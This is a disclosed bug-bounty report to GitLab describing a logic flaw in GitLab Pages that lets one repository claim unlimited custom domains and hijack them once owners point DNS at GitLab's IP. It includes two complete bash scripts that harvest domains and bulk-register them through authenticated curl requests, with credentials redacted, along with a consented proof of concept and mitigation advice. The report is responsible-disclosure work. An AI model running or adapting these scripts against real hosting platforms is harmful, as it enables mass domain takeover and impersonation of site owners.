# Using GitLab to monitor and hijack domains in mass quantity.

## Report Details
- **Report ID**: 312118
- **URL**: https://hackerone.com/reports/312118
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-04T14:25:08.445Z
- **Disclosed**: 2018-02-21T23:46:26.928Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
# Vulnerability Description

There is a logic flaw in how GitLab pages can set custom domains that allows an attacker to actively monitor domains and hijack them as soon as they point to `52.167.214.135`. GitLab allows setting an unlimited number of domains for a single repository. 

First, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.

```bash
#!/bin/bash

searches=(
    "The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it."
)

gron "https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135" | fgrep "domain" | grep -o '"[^"]\+"' | cut -d '"' -f 2 > whiteknight-temp

while read domain; do
    if host "$domain"> /dev/null; then
        echo $domain;
    fi;
done < whiteknight-temp >> domains

cat domains | uniq | sed -e 's/^/https:\/\//' >> domains-to-test

meg / domains-to-test

for str in "${searches[@]}"; do
    grep --color -Hnri "$str" out/
done

while read target; do
    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data "utf8=✓&authenticity_token=████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]"
done < domains

gio trash whiteknight-temp domains domains-to-test out/
```

Then I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to `52.167.214.135`, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.

```bash
#!/bin/bash

IPS=(
    # GitLab
    "52.167.214.135"
    # GitHub
    "192.30.252.153"
    "192.30.252.154"
    # Shopify
    "23.227.38.32"
)

for ip in "${IPS[@]}"; do
    gron "https://app.securitytrails.com/api/search/by_type/ip/$ip" | fgrep "domain" | grep -o '"[^"]\+"' | cut -d '"' -f 2 > whiteknight-temp
done

while read domain; do
    if host "$domain"> /dev/null; then
        echo $domain;
    fi;
done < whiteknight-temp >> domains

while read target; do
    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data "utf8=✓&authenticity_token=███████████████████&pages_domain[domain]=$target&pages_domain[certificate]&pages_domain[key]"
done < domains

gio trash whiteknight-temp domains domains-to-test out/
```

Please note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use `securitytrails.com` to demonstrate the issue without affecting your users.

# Proof of concept

With my colleague's permission, I asked them to set an A record for their personal domain (http://danfield.photography/) pointing to `52.167.214.135`. They set the A record **after** I had added their domain to my repository. After a couple of minutes, their domain was serving my repository's content.

# Mitigation

Since this is a logic flaw, there will be multiple ways to mitigate the issue.

1. You could restrict repositories to only a single custom domain — this is what GitHub does.
2. Require users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.
3. Not store the domain until it actually points to `52.167.214.135` — currently you store any domain pointing to various other services and IPs.

## Impact

GitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.

## Attachments
No attachments
